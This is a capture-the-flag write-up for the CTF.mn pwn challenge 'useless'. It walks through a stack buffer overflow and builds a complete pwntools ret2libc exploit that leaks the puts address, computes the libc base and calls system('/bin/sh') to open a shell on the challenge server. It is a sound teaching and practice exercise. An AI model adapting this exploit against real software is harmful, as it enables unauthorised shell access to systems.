---
slug: "pwn-useless"
title: "useless"
competition: "CTF.mn"
category: "Pwn"
difficulty: "Medium"
date: "2026-10-23"
updated: "2026-10-30"
summary: "BOF → ret2libc"
tags: ["ROP","RET2LIBC","BUFFER OVERFLOW"]
status: "published"
flag: "HZU18{type_it_manually_if_you_want_but_better_you_do_it_yourself}"
attachments: []
source: "https://claritys.web.id/writeups/pwn-useless"
---

# useless

> BOF → ret2libc

## Challenge

-   **Poin / solves:** 985 / 6
    
-   **Deskripsi:** Жишээ: [https://www.youtube.com/watch?v=xrA4eouTmnI&ab\_channel=ByamB4](https://www.youtube.com/watch?v=xrA4eouTmnI&ab_channel=ByamB4)
    

## Recon

We got 2 file, `libc.so.6` and `useless.`

```bash
~/ctf/pwncheatsheet/ctfmn/useless main*
❯ checksec useless                                                              󰥔 18:45:55
[*] '/home/claritys/ctf/pwncheatsheet/ctfmn/useless/useless'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

First thing we gonna do its patch the file so we can remote later.

```python
~/ctf/pwncheatsheet/ctfmn/useless/onceagain main*
❯ pwninit useless elf libc.so.6                                                 󰥔 18:49:23
bin: useless
libc: ./libc.so.6

fetching linker
https://launchpad.net/ubuntu/+archive/primary/+files//libc6_2.39-0ubuntu8.4_amd64.deb
Found matching file: ./usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
setting ./ld-2.39.so executable
copying useless to useless_patched
running patchelf on useless_patched
writing solve.py stub
```

Now lets decompile this file so we can read the pseudocode of this file, but the result only `main` that’s important.

## Vulnerability

```python

//----- (00000000004011EC) ----------------------------------------------------
int __fastcall main(int argc, const char **argv, const char **envp)
{
  char s[32]; // [rsp+0h] [rbp-20h] BYREF

  printf("> ");
  fgets(s, 3000, stdin);
  puts("BYE");
  return 0;
}
```

As we can see, there’s a `buffer overflow`. Because `fgets` allocate the input to variable named `s` in size 32, whereas `fgets` allow us up to `3000` inputs.

In the end of the function `main`, there’s also a `return 0`, which is allowed us to overwrite the return address in `RBP+8` by assembly. But there’s no target function for return, so we have to use `ret2libc` technique to get the shell.

## Exploit plan

Our first step is search for the offset `RBP+8` (return). We use `pwndbg` so we can easily search the offset and debugging faster, we also use command `cyclic` so we can get the random text that can search the offset.

![image.png](/assets/uploads/a140e995-59ec-489a-bef5-827c3ffed0a3-image.png)

Alright now we get the offset at 40 bytes, now lets search the needs for making the leak payload.

```python
~/ctf/pwncheatsheet/ctfmn/useless/onceagain main*
❯ ropper --file useless --search "pop"                                          󰥔 19:08:08
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop

[INFO] File: useless
0x000000000040117d: pop rbp; ret;
0x00000000004011e5: pop rdi; ret;
0x00000000004011e7: pop rsi; ret;

pwndbg> disas puts
Dump of assembler code for function puts@plt:
   0x0000000000401070 <+0>:     endbr64
   0x0000000000401074 <+4>:     jmp    QWORD PTR [rip+0x2f86]        # 0x404000 <puts@got.plt>
   0x000000000040107a <+10>:    nop    WORD PTR [rax+rax*1+0x0]
End of assembler dump.
```

We got what we needs now, lets create the leak payload.

```python
    rdi = 0x00000000004011e5
    pltputs = 0x0000000000401070
    gotputs = 0x404000
    main = elf.sym['main']
    leakpayload = flat({40:[rdi, gotputs, pltputs, main]}) 
    r.sendline(leakpayload)
    r.recvline() #take dummy (> BYE)
    leak = r.recvline().strip(b'\n')
    putsleak = u64(leak.ljust(8,b'\x00'))
    log.success(f'Dapet segini: {hex(putsleak)}')
    libc.address = putsleak - libc.sym['puts']
    log.success(f'baselibcnya {hex(libc.address)}')
```

We use that payload so we can leak the `puts` address alocated in `libc`. This is for searching the base libc so we can call another function in libc that in the elf doesn’t have it.

![image.png](/assets/uploads/deda0794-a298-44c9-862e-e8d9a711891d-image-1.png)

Alright now we got the base libc, now we need `ret` for stack alignment.

```python
~/ctf/pwncheatsheet/ctfmn/useless/onceagain main*
❯ ropper --file useless --search "ret"                                          󰥔 19:07:03
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: ret

[INFO] File: useless
0x000000000040105a: ret 0xffff;
0x000000000040101a: ret;
```

This is the payload so we can get the shell but leak first.

```python
    ret = 0x000000000040101a
    rdi = 0x00000000004011e5
    pltputs = 0x0000000000401070
    gotputs = 0x404000
    main = elf.sym['main']
    leakpayload = flat({40:[rdi, gotputs, pltputs, main]}) 
    r.sendline(leakpayload)
    r.recvline() #take dummy (> BYE)
    leak = r.recvline().strip(b'\n')
    putsleak = u64(leak.ljust(8,b'\x00'))
    log.success(f'Dapet segini: {hex(putsleak)}')
    libc.address = putsleak - libc.sym['puts']
    log.success(f'baselibcnya {hex(libc.address)}')
    binsh = next(libc.search(b'/bin/sh\x00'))
    system = libc.sym['system']
    payload = flat({40:[ret, rdi, binsh, system]})
    r.sendline(payload)
```

![image.png](/assets/uploads/0412050f-2c71-4dbf-944a-cb7eb9eff755-image-2.png)

Soo yeah now we can remote this solver now and we got the flag.

![image.png](/assets/uploads/8dabcca2-2c7f-4da9-a6bf-be561cf0533a-image-3.png)

## Exploit

```python
#!/usr/bin/env python3

from pwn import *

elf = ELF("useless_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.39.so")

context.binary = elf
context.terminal = ["ghostty", "-e"]
# Use the portable pwndbg bundle (/usr/local/bin/pwndbg) as the gdb pwntools launches.
# It ships its own gdb+python and loads pwndbg itself, so there is no gdbinit.py to source.
context.gdb_binary = "pwndbg"

if args.DEBUG:
    context.log_level = "debug"

gdbscript = """
set pagination off
set confirm off

break main
continue
"""

def conn():
    if args.GDB:
        r = process([elf.path])
        gdb.attach(r, gdbscript=gdbscript)
        return r

    if args.LOCAL:
        return process([elf.path])

    return remote("iv26rj7c.i.ctf.mn", 443, ssl=True, sni='iv26rj7c.i.ctf.mn')

def main():
    r = conn()
    ret = 0x000000000040101a
    rdi = 0x00000000004011e5
    pltputs = 0x0000000000401070
    gotputs = 0x404000
    main = elf.sym['main']
    leakpayload = flat({40:[rdi, gotputs, pltputs, main]}) 
    r.sendline(leakpayload)
    r.recvline() #take dummy (> BYE)
    leak = r.recvline().strip(b'\n')
    putsleak = u64(leak.ljust(8,b'\x00'))
    log.success(f'Dapet segini: {hex(putsleak)}')
    libc.address = putsleak - libc.sym['puts']
    log.success(f'baselibcnya {hex(libc.address)}')
    binsh = next(libc.search(b'/bin/sh\x00'))
    system = libc.sym['system']
    payload = flat({40:[ret, rdi, binsh, system]})
    r.sendline(payload)
    # good luck pwning :)
    r.interactive()

if __name__ == "__main__":
    main()
```
